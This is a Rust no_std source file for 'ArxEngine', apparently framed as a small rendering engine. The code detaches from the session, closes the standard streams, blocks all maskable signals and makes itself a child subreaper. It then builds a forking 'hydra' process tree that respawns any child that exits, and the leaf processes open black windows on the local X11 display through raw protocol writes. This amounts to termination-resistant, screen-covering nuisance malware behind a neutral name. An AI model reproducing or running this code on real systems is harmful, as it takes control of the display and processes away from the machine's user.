#![no_std]

const SOCKADDR: [u8; 20] = [
    1, 0,
    b'/', b't', b'm', b'p', b'/',
    b'.', b'X', b'1', b'1', b'-',
    b'u', b'n', b'i', b'x', b'/',
    b'X', b'0', 0,
];

const SETUP_REQ: [u8; 12] = [
    0x6C, 0x00,
    0x0B, 0x00,
    0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00,
    0x00, 0x00,
];

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memset(dest: *mut u8, c: i32, n: usize) -> *mut u8 {
    let mut i = 0usize;
    while i < n {
        unsafe { *dest.add(i) = c as u8; }
        i += 1;
    }
    dest
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memcpy(dest: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    let mut i = 0usize;
    while i < n {
        unsafe { *dest.add(i) = *src.add(i); }
        i += 1;
    }
    dest
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
    let mut i = 0usize;
    while i < n {
        let av = unsafe { *a.add(i) };
        let bv = unsafe { *b.add(i) };
        if av != bv {
            return av as i32 - bv as i32;
        }
        i += 1;
    }
    0
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn bcmp(a: *const u8, b: *const u8, n: usize) -> i32 {
    unsafe { memcmp(a, b, n) }
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn memmove(dest: *mut u8, src: *const u8, n: usize) -> *mut u8 {
    if (dest as usize) < (src as usize) {
        let mut i = 0usize;
        while i < n {
            unsafe { *dest.add(i) = *src.add(i); }
            i += 1;
        }
    } else {
        let mut i = n;
        while i > 0 {
            i -= 1;
            unsafe { *dest.add(i) = *src.add(i); }
        }
    }
    dest
}

#[panic_handler]
fn _ph(_: &core::panic::PanicInfo) -> ! {
    unsafe {
        core::arch::asm!(
            "syscall",
            in("rax") 231_i64,
            in("rdi") 1_i64,
            options(noreturn, nostack),
        );
    }
}

#[inline(always)]
unsafe fn sys_exit_group(status: i64) -> ! {
    unsafe {
        core::arch::asm!(
            "syscall",
            in("rax") 231_i64,
            in("rdi") status,
            options(noreturn, nostack),
        );
    }
}

#[inline(always)]
unsafe fn sys_socket() -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 41_i64 => ret,
            in("rdi") 1_i64,
            in("rsi") 1_i64,
            in("rdx") 0_i64,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_connect(fd: i64, addr: *const u8, len: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 42_i64 => ret,
            in("rdi") fd,
            in("rsi") addr as i64,
            in("rdx") len,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_write(fd: i64, buf: *const u8, count: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 1_i64 => ret,
            in("rdi") fd,
            in("rsi") buf as i64,
            in("rdx") count,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_read(fd: i64, buf: *mut u8, count: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 0_i64 => ret,
            in("rdi") fd,
            in("rsi") buf as i64,
            in("rdx") count,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_close(fd: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 3_i64 => ret,
            in("rdi") fd,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_fork() -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 57_i64 => ret,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_wait4(pid: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 61_i64 => ret,
            in("rdi") pid,
            in("rsi") 0_i64,
            in("rdx") 0_i64,
            in("r10") 0_i64,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_setsid() -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 112_i64 => ret,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_rt_sigprocmask(how: i64, set: *const u64, sigsetsize: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 14_i64 => ret,
            in("rdi") how,
            in("rsi") set as i64,
            in("rdx") 0_i64,
            in("r10") sigsetsize,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn sys_prctl(option: i64, arg2: i64) -> i64 {
    let ret: i64;
    unsafe {
        core::arch::asm!(
            "syscall",
            inout("rax") 157_i64 => ret,
            in("rdi") option,
            in("rsi") arg2,
            in("rdx") 0_i64,
            in("r10") 0_i64,
            in("r8") 0_i64,
            out("rcx") _,
            out("r11") _,
            options(nostack),
        );
    }
    ret
}

#[inline(always)]
unsafe fn read_u16(buf: *const u8, off: usize) -> u16 {
    unsafe { core::ptr::read_unaligned(buf.add(off) as *const u16) }
}

#[inline(always)]
unsafe fn read_u32(buf: *const u8, off: usize) -> u32 {
    unsafe { core::ptr::read_unaligned(buf.add(off) as *const u32) }
}

#[inline(always)]
unsafe fn write_u16(buf: *mut u8, off: usize, val: u16) {
    unsafe { core::ptr::write_unaligned(buf.add(off) as *mut u16, val) }
}

#[inline(always)]
unsafe fn write_u32(buf: *mut u8, off: usize, val: u32) {
    unsafe { core::ptr::write_unaligned(buf.add(off) as *mut u32, val) }
}

#[inline(always)]
unsafe fn renderer(ox: i16, oy: i16, w: u16, h: u16) -> ! {
    unsafe {
        let fd = sys_socket();
        if fd < 0 {
            sys_exit_group(0);
        }

        let ret = sys_connect(fd, SOCKADDR.as_ptr(), 20);
        if ret < 0 {
            let _ = sys_close(fd);
            sys_exit_group(0);
        }

        let _ = sys_write(fd, SETUP_REQ.as_ptr(), 12);

        let mut buf = core::mem::MaybeUninit::<[u8; 4096]>::uninit();
        let buf_ptr = buf.as_mut_ptr() as *mut u8;
        let n = sys_read(fd, buf_ptr, 4096);
        if n < 8 {
            let _ = sys_close(fd);
            sys_exit_group(0);
        }

        let bp = buf_ptr as *const u8;

        if *bp != 1 {
            let _ = sys_close(fd);
            sys_exit_group(0);
        }

        let id_base = read_u32(bp, 12);
        let vendor_len = read_u16(bp, 24) as usize;
        let num_fmts = *bp.add(29) as usize;
        let padded_vendor = (vendor_len + 3) & !3;
        let screen_off = 40 + padded_vendor + num_fmts * 8;

        if screen_off + 40 > n as usize {
            let _ = sys_close(fd);
            sys_exit_group(0);
        }

        let root_wid = read_u32(bp, screen_off);
        let black_pixel = read_u32(bp, screen_off + 12);
        let scr_w = read_u16(bp, screen_off + 20) as i32;
        let scr_h = read_u16(bp, screen_off + 22) as i32;
        let root_visual = read_u32(bp, screen_off + 32);
        let root_depth = *bp.add(screen_off + 38);

        let window_id = id_base | 1;

        let fx = ((scr_w - w as i32) / 2 + ox as i32) as i16;
        let fy = ((scr_h - h as i32) / 2 + oy as i32) as i16;

        let mut req = core::mem::MaybeUninit::<[u8; 40]>::uninit();
        let rp = req.as_mut_ptr() as *mut u8;
        *rp.add(0) = 1;
        *rp.add(1) = root_depth;
        write_u16(rp, 2, 10);
        write_u32(rp, 4, window_id);
        write_u32(rp, 8, root_wid);
        write_u16(rp, 12, fx as u16);
        write_u16(rp, 14, fy as u16);
        write_u16(rp, 16, w);
        write_u16(rp, 18, h);
        write_u16(rp, 20, 0);
        write_u16(rp, 22, 1);
        write_u32(rp, 24, root_visual);
        write_u32(rp, 28, 0x00000202);
        write_u32(rp, 32, black_pixel);
        write_u32(rp, 36, 1);

        let _ = sys_write(fd, rp as *const u8, 40);

        let mut map_req = core::mem::MaybeUninit::<[u8; 8]>::uninit();
        let mp = map_req.as_mut_ptr() as *mut u8;
        *mp.add(0) = 8;
        *mp.add(1) = 0;
        write_u16(mp, 2, 2);
        write_u32(mp, 4, window_id);

        let _ = sys_write(fd, mp as *const u8, 8);

        loop {
            let nr = sys_read(fd, buf_ptr, 4096);
            if nr <= 0 {
                let _ = sys_close(fd);
                sys_exit_group(0);
            }
        }
    }
}

#[inline(never)]
unsafe fn hydra(depth: u32, ox: i16, oy: i16, w: u16, h: u16) -> ! {
    unsafe {
        if depth >= 3 {
            renderer(ox, oy, w, h);
        }
        loop {
            let pid = sys_fork();
            if pid == 0 {
                hydra(depth + 1, ox, oy, w, h);
            }
            if pid > 0 {
                let _ = sys_wait4(pid);
            }
        }
    }
}

#[inline(always)]
unsafe fn core_ignite(ox: i16, oy: i16, w: u16, h: u16) -> ! {
    unsafe {
        let _ = sys_setsid();
        let _ = sys_close(0);
        let _ = sys_close(1);
        let _ = sys_close(2);
        let mask: u64 = !0u64;
        let _ = sys_rt_sigprocmask(0, &mask as *const u64, 8);
        let _ = sys_prctl(36, 1);
        hydra(0, ox, oy, w, h);
    }
}

pub struct ArxEngine;

impl ArxEngine {
    #[inline(always)]
    pub fn ignite(
        center_offset_x: i16,
        center_offset_y: i16,
        width: u16,
        height: u16,
    ) -> ! {
        unsafe { core_ignite(center_offset_x, center_offset_y, width, height) }
    }
}

#[unsafe(no_mangle)]
pub unsafe extern "C" fn arx_engine_ignite(
    center_offset_x: i16,
    center_offset_y: i16,
    width: u16,
    height: u16,
) -> ! {
    unsafe { core_ignite(center_offset_x, center_offset_y, width, height) }
}